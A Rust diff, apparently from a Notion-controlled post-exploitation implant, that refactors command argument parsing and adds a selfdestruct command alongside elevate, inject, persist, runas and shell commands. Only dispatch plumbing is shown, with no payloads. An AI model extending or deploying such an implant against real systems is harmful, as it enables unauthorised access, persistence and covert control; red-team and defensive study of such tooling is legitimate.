@@ -1,6 +1,8 @@
 // Standard Library Imports
 use std::error::Error;
+use std::iter::Iterator;
 use std::result::Result;
+use core::str::Split;
 use std::fmt;
 // Local imports
 use crate::config::ConfigOptions;
@@ -22,31 +24,46 @@ mod sleep;
 mod shutdown;
 mod whoami;
 mod unknown;
+mod selfdestruct;
+
+
+macro_rules! notion_out {
+    ($s:literal) => {
+        Ok(format!($s))
+    };
+    ($s:literal, $e:ident) => {
+        Ok(format!($s, $e))
+    }
+    
+}
+pub(crate) use notion_out;
 
 /// All the possible command types. Some have command strings, and some don't.
 pub enum CommandType {
-    Cd(String),
-    Download(String),
-    Elevate(String),
+    Cd,
+    Download,
+    Elevate,
     Getprivs,
-    Inject(String),
-    Portscan(String),
-    Persist(String),
+    Inject,
+    Portscan,
+    Persist,
     Ps,
     Pwd,
-    Save(String),
-    Runas(String),
-    Shell(String),
+    Save,
+    Selfdestruct,
+    Runas,
+    Shell,
     Shutdown,
-    Sleep(String),
+    Sleep,
     Whoami,
-    Unknown(String)
+    Unknown
 }
 
 /// Simple errors for the construction of a NotionCommand.
 /// Returned if construction fails.
 #[derive(Debug)]
 pub struct CommandError(String);
+impl Error for CommandError {}
 
 impl fmt::Display for CommandError {
     fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
@@ -54,11 +71,79 @@ impl fmt::Display for CommandError {
     }
 }
 
-impl Error for CommandError {}
+/// A custom struct for our command arguments
+/// This allow easier passing and safety for them.
+/// 
+/// As an `Iterator`, `CommandArgs` and be unwrapped with default
+/// values as a safety for missing or malformed args.
+#[derive(Debug)]
+pub struct CommandArgs {
+    items: Vec<String>,
+    count: usize
+}
+
+
+impl CommandArgs {
+
+    /// Default constructor for `CommandArgs`.
+    /// 
+    /// Handy to have in modules that use other modules as 
+    /// part of their operation.
+    pub fn new(args: Vec<String> ) -> CommandArgs {
+        CommandArgs { items: args, count: 0 }
+    }
+
+    /// This is the constructor we use to build `CommandArgs` from
+    /// the incoming `Split<&str>`. It might seem goofy, but 
+    /// it's a clean way to get the first arg and then build our 
+    /// `CommandArgs`.
+    pub fn from_split(args_split: Split<&str> ) -> CommandArgs {
+        let items: Vec<String> = args_split
+            .map(|a| a.trim().to_string())
+            .collect();
+        CommandArgs { items: items, count: 0 }
+    }
+
+    pub fn from_string(args_string: String) -> CommandArgs {
+        let items: Vec<String> = args_string
+            .split(" ")
+            .map(|s| s.trim().to_string())
+            .collect();
+
+        CommandArgs { items: items, count: 0 }
+    }
+
+    /// Converts the args into a space-separated string.
+    /// 
+    /// Real handy for shell commands.
+    pub fn to_string(&self) -> String {
+        self.items
+            .as_slice()
+            .join(" ")
+            .trim()
+            .to_string()
+    }
+}
+
+impl Iterator for CommandArgs {
+    type Item = String;
+
+    fn next(&mut self) -> Option<Self::Item> {
+
+        if self.items.len() > self.count {
+            self.count += 1;
+            Some(self.items[self.count - 1].to_string())
+        } else {
+            None
+        }
+    }
+}
+
 
 /// The command itself, containing the `CommandType` enum
 pub struct NotionCommand {
     pub command_type: CommandType,
+    pub args: CommandArgs
 }
 
 impl NotionCommand {
@@ -70,54 +155,54 @@ impl NotionCommand {
         // The call to this function clears the target emoji
         // TODO: Maybe do that here?
         if let Some(t) = command_words.nth(0) {
-            let command_string = String::from(
-                command_words.collect::<Vec<&str>>()
-                .as_slice()
-                .join::<&str>(" ")
-            );
+
+            let command_args  = CommandArgs::from_split(command_words);
+
             let command_type: CommandType = match t {
-                "cd"       => CommandType::Cd(command_string),
-                "download" => CommandType::Download(command_string),
-                "elevate"  => CommandType::Elevate(command_string),
+                "cd"       => CommandType::Cd,
+                "download" => CommandType::Download,
+                "elevate"  => CommandType::Elevate,
                 "getprivs" => CommandType::Getprivs,
-                "inject"   => CommandType::Inject(command_string),
-                "persist"  => CommandType::Persist(command_string),
-                "portscan" => CommandType::Portscan(command_string),
+                "inject"   => CommandType::Inject,
+                "persist"  => CommandType::Persist,
+                "portscan" => CommandType::Portscan,
                 "ps"       => CommandType::Ps,
                 "pwd"      => CommandType::Pwd,
-                "runas"    => CommandType::Runas(command_string),
-                "save"     => CommandType::Save(command_string),
-                "shell"    => CommandType::Shell(command_string),
+                "runas"    => CommandType::Runas,
+                "save"     => CommandType::Save,
+                "selfdestruct" => CommandType::Selfdestruct,
+                "shell"    => CommandType::Shell,
                 "shutdown" => CommandType::Shutdown,
-                "sleep"    => CommandType::Sleep(command_string),
+                "sleep"    => CommandType::Sleep,
                 "whoami"   => CommandType::Whoami,
-                _          => CommandType::Unknown(command_string),
+                _          => CommandType::Unknown,
             };
-            return Ok(NotionCommand { command_type: command_type});
+            return Ok(NotionCommand { command_type: command_type, args: command_args});
 
         } else {
             Err(CommandError("Could not parse command!".to_string()))
         }
     }
     /// Executes the appropriate function for the `command_type`. 
-    pub async fn handle(&self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
+    pub async fn handle(&mut self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
         match &self.command_type {
-            CommandType::Cd(s)       => cd::handle(&s),
-            CommandType::Download(s) => download::handle(&s, logger).await,
-            CommandType::Elevate(s)  => elevate::handle(&s, config_options).await,
+            CommandType::Cd       => cd::handle(&mut self.args),
+            CommandType::Download => download::handle( &mut self.args, logger).await,
+            CommandType::Elevate  => elevate::handle(&mut self.args, config_options).await,
             CommandType::Getprivs    => getprivs::handle().await,
-            CommandType::Inject(s)   => inject::handle(&s, logger).await,
-            CommandType::Persist(s)  => persist::handle(&s, config_options, logger).await,
-            CommandType::Portscan(s) => portscan::handle(&s, logger).await,
+            CommandType::Inject   => inject::handle(&mut self.args, logger).await,
+            CommandType::Persist  => persist::handle(&mut self.args, config_options, logger).await,
+            CommandType::Portscan => portscan::handle(&mut self.args, logger).await,
             CommandType::Ps          => ps::handle().await,
             CommandType::Pwd         => pwd::handle().await,
-            CommandType::Runas(s)    => runas::handle(&s).await,
-            CommandType::Save(s)     => save::handle(&s, config_options).await,
-            CommandType::Shell(s)    => shell::handle(&s).await,
+            CommandType::Runas    => runas::handle(&self.args).await,
+            CommandType::Save     => save::handle(&mut self.args, config_options).await,
+            CommandType::Selfdestruct => selfdestruct::handle().await,
+            CommandType::Shell    => shell::handle(&mut self.args).await,
             CommandType::Shutdown    => shutdown::handle().await,
-            CommandType::Sleep(s)    => sleep::handle(&s, config_options).await,
+            CommandType::Sleep    => sleep::handle(&mut self.args, config_options).await,
             CommandType::Whoami      => whoami::handle().await,
-            CommandType::Unknown(_)  => unknown::handle().await
+            CommandType::Unknown  => unknown::handle().await,
         }
     }
 }
